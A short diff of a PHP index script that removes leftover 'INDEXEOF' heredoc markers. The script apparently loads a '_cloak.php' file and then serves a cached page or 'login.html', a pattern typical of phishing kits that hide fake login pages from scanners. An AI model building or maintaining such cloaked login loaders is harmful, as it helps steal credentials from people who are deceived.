@@ -1,4 +1,4 @@
-INDEXEOF'
+
 <?php
 $cloak_file = __DIR__ . '/../_cloak.php';
 if (file_exists($cloak_file)) {
@@ -14,4 +14,3 @@ if (file_exists($cache_path)) {
 } else {
     readfile(__DIR__ . '/login.html');
 }
-INDEXEOF
